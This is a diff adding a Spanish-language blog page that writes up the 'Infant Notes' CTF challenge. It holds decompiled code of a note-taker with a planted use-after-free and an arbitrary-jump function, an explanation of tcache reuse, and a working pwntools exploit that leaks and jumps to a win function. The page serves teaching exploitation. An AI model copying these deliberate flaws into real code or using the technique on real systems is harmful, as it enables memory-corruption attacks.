@@ -1,0 +1,610 @@
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Infant Notes — Zereza's Blog</title>
+  <meta name="description" content="Blog de ciberseguridad. Writeups, notas técnicas e investigación.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%230E1120'/><circle cx='16' cy='16' r='6' fill='none' stroke='%237EC8E3' stroke-width='2'/><circle cx='16' cy='16' r='2' fill='%237EC8E3'/></svg>">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Infant Notes | Zereza’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Infant Notes" />
+<meta name="author" content="Miguel Peñaranda" />
+<meta property="og:locale" content="es" />
+<meta name="description" content="Introduccion" />
+<meta property="og:description" content="Introduccion" />
+<link rel="canonical" href="http://0.0.0.0:4000/challenges/infant-notes/" />
+<meta property="og:url" content="http://0.0.0.0:4000/challenges/infant-notes/" />
+<meta property="og:site_name" content="Zereza’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-31T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Infant Notes" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel Peñaranda"},"dateModified":"2026-03-31T00:00:00+02:00","datePublished":"2026-03-31T00:00:00+02:00","description":"Introduccion","headline":"Infant Notes","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/challenges/infant-notes/"},"url":"http://0.0.0.0:4000/challenges/infant-notes/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav__inner">
+    <a href="/" class="nav__logo">
+      <span class="nav__logo-dot"></span>
+      Zereza's Blog
+    </a>
+    <ul class="nav__links" id="nav-links">
+      <li><a href="/" >inicio</a></li>
+      <li><a href="/about/" >whoami</a></li>
+      <li><a href="/posts/" >posts</a></li>
+      <li><a href="/challenges/" class="active">retos</a></li>
+    </ul>
+    <div class="nav__tools">
+      <div class="lang-switch" aria-label="Language switcher">
+        <a href="/challenges/infant-notes/" class="active">ES</a>
+        <a href="/en/challenges/infant-notes/" >EN</a>
+      </div>
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener" class="nav__cta">github ↗</a>
+    </div>
+    <button class="nav__burger" onclick="document.getElementById('nav-links').classList.toggle('open')">≡</button>
+  </div>
+</nav>
+
+<main>
+
+
+<div class="page page--with-toc">
+  <aside class="toc-sidebar" id="toc-sidebar">
+    <div class="toc-sidebar__inner">
+      <span class="toc-sidebar__title">Contenido</span>
+      <nav class="toc-nav" id="toc-nav"></nav>
+    </div>
+  </aside>
+
+  <article class="post-wrap">
+
+    <a href="/challenges/" class="post-back">← volver a challenges</a>
+
+    <header class="post-header">
+      <div class="post-header-tags">
+        
+      </div>
+      <h1>Infant Notes</h1>
+      <div class="post-header-meta">
+        
+        <span>31 de March de 2026</span>
+        
+        
+      </div>
+    </header>
+
+    
+
+    <div class="prose" id="prose-content">
+      <h2 id="introduccion">Introduccion</h2>
+
+<p>En este reto se nos proporciona:</p>
+<ul>
+  <li>El binario <a href="/assets/scripts/infant-notes/chall"><strong>chall</strong></a></li>
+  <li>Un archivo <strong>flag.txt</strong> con el contenido <strong>“HackOn{FAKE_FLAG}”</strong>.</li>
+</ul>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+
+<p>Empezamos con el análisis básico del binario, vamos a tirar un checksec para ver que protecciones tiene:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>zereza@kali:~/infant-notes<span class="nv">$ </span>checksec chall
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Vemos que el reto tiene protecion <strong>NX</strong>, <strong>Canary</strong>, <strong>PIE</strong> y <strong>Partial RELRO</strong>.</p>
+
+<h2 id="análisis">Análisis</h2>
+
+<p>Analizando el binario con <strong>Ghidra</strong>, tenemos el siguiente pseudocodigo (he renombrado algunas variables):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">option</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"==========================="</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"     Note taker            "</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"==========================="</span><span class="p">);</span>
+<span class="nl">LAB_0010164a:</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">menu</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
+    <span class="n">__isoc23_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">option</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">secret</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">5</span> <span class="o">&lt;</span> <span class="n">option</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_001016e2</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">jump</span><span class="p">();</span>
+      <span class="k">goto</span> <span class="n">LAB_0010164a</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">delete</span><span class="p">();</span>
+        <span class="k">goto</span> <span class="n">LAB_0010164a</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">create</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_001016e2</span><span class="p">;</span>
+          <span class="n">show</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">goto</span> <span class="n">LAB_0010164a</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="nl">LAB_001016e2:</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid"</span><span class="p">);</span>
+  <span class="k">goto</span> <span class="n">LAB_0010164a</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"1. Create"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Show"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"3. Delete"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"4. Jump"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"5. Exit"</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">create</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">pChunk</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">__isoc23_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(((</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&lt;</span> <span class="n">index</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid ID"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">pChunk</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pChunk</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
+    <span class="n">__isoc23_scanf</span><span class="p">(</span><span class="s">"%31s"</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Note created"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">__isoc23_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(((</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&lt;</span> <span class="n">index</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Note deleted"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">show</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">__isoc23_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(((</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&lt;</span> <span class="n">index</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid ID"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Data: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">**</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">**</span><span class="p">)(</span><span class="n">notes</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">jump</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">code</span> <span class="o">*</span><span class="n">function</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Address: "</span><span class="p">);</span>
+  <span class="n">__isoc23_scanf</span><span class="p">(</span><span class="s">"%lx"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">function</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Jumping..."</span><span class="p">);</span>
+  <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">secret</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">undefined8</span> <span class="o">*</span><span class="n">pChunk</span><span class="p">;</span>
+
+  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">pChunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+  <span class="o">*</span><span class="n">pChunk</span> <span class="o">=</span> <span class="n">win</span><span class="p">;</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="flujo-del-programa">Flujo del Programa</h2>
+
+<p>Este programa muestra un menu con las siguientes opciones:</p>
+<ol>
+  <li>Crear en un indice un <strong>chunk</strong> de 0x20 y escribir datos</li>
+  <li>Mostrar los primeros 8 bytes de un <strong>chunk</strong></li>
+  <li>Liberar un <strong>chunk</strong>, pero no borra su recerencia de los indices <strong>(¡UAF!)</strong>.</li>
+  <li>Saltar a una dirección de memoria.</li>
+  <li>Salir del programa.</li>
+  <li><strong>Funcion Secreta:</strong> Aloca un <strong>chunk</strong> de 0x20 y escribe la dirección de <code class="language-plaintext highlighter-rouge">win</code>.</li>
+</ol>
+
+<p>Aquí es muy claro ver el objetivo final, conseguir la dirección de <code class="language-plaintext highlighter-rouge">win</code> para saltar con <code class="language-plaintext highlighter-rouge">jump</code>. Y para conseguir esa direccion necesitamos tener control del chunk que aloca <code class="language-plaintext highlighter-rouge">secret</code>. ¿Cómo podemos hacer esto?</p>
+
+<h2 id="use-after-free">Use After Free</h2>
+
+<p>La clave está en que cuando liberamos un <strong>chunk</strong> no borra su referencia de los índices. Cuando hacemos <code class="language-plaintext highlighter-rouge">free()</code> de un <strong>chunk</strong> pequeño (como uno de tamaño <strong>0x20</strong>), <strong>glibc</strong> no lo devuelve inmediatamente al sistema, sino que lo guarda en una estructura llamada <strong>tcache (thread cache)</strong>.</p>
+
+<p>La <strong>tcache</strong> funciona como una <strong>pila (LIFO, Last In First Out)</strong>. Esto significa que el último chunk liberado de un determinado tamaño será el primero en ser reutilizado en una llamada posterior a <code class="language-plaintext highlighter-rouge">malloc</code> del mismo tamaño.</p>
+
+<p>En la práctica, esto implica que si liberamos un chunk y luego hacemos otro <code class="language-plaintext highlighter-rouge">malloc</code> del mismo tamaño, recibiremos exactamente ese mismo <strong>chunk</strong>.</p>
+
+<p>Más información sobre la <strong>tcache</strong>:</p>
+<ul>
+  <li><a href="https://ir0nstone.gitbook.io/notes/binexp/heap/the-tcache">https://ir0nstone.gitbook.io/notes/binexp/heap/the-tcache</a></li>
+  <li><a href="https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html">https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html</a></li>
+</ul>
+
+<h2 id="estrategia-de-explotacion">Estrategia de Explotacion</h2>
+
+<p>La estrategia de explotación será la siguiente:</p>
+<ol>
+  <li>Creamos un <strong>chunk</strong> <em>(no hace falta escribir datos)</em>.</li>
+  <li>Liberamos ese <strong>chunk</strong>.</li>
+  <li>Llamamos a la <strong>función secreta</strong> para que al hacer <code class="language-plaintext highlighter-rouge">malloc()</code> reutilice ese <strong>chunk</strong> y escriba la dirección de <code class="language-plaintext highlighter-rouge">win</code>.</li>
+  <li>Mostramos los datos de nuestro <strong>chunk</strong> anterior, para que nos muestre la dirección de <code class="language-plaintext highlighter-rouge">win</code>.</li>
+  <li>Saltamos a <code class="language-plaintext highlighter-rouge">win</code>.</li>
+</ol>
+
+<p>Aquí me he montado un pequeño exploit para conseguir la flag.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./chall</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Data: </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">secret</span><span class="p">():</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">6</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">getaddr</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Data: </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">addr</span>
+
+<span class="k">def</span> <span class="nf">jump</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">4</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+
+<span class="nf">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nf">secret</span><span class="p">()</span>
+<span class="n">win</span> <span class="o">=</span> <span class="nf">getaddr</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="nf">jump</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/challenges/infant-notes/img0.png" alt="PoC" /></p>
+
+<h2 id="exploit">Exploit</h2>
+<p><strong>¡Gracias por llegar hasta el final!</strong></p>
+
+<p>Puedes encontrar el exploit completo aquí: <a href="/assets/scripts/infant-notes/exploit.py">exploit.py</a></p>
+
+    </div>
+
+    <nav class="post-nav">
+      
+      <a href="/challenges/spillme/" class="post-nav-link">
+        <span class="post-nav-dir">← anterior</span>
+        <span class="post-nav-title">SpillMe</span>
+      </a>
+      
+
+      
+      <a href="/challenges/sessiond/" class="post-nav-link" style="text-align:right;">
+        <span class="post-nav-dir">siguiente →</span>
+        <span class="post-nav-title">Sessiond</span>
+      </a>
+      
+    </nav>
+
+  </article>
+</div>
+
+<script>
+(function() {
+  var prose = document.getElementById('prose-content');
+  var nav   = document.getElementById('toc-nav');
+  if (!prose || !nav) return;
+
+  var headings = prose.querySelectorAll('h2, h3');
+  if (headings.length === 0) return;
+
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function(h, i) {
+    if (!h.id) {
+      h.id = 'toc-' + i + '-' + h.textContent.trim().toLowerCase().replace(/[^\w\s-]/g, '').replace(/\s+/g, '-');
+    }
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-item--' + h.tagName.toLowerCase();
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.className = 'toc-link';
+    a.textContent = h.textContent;
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  /* Active link highlight on scroll */
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
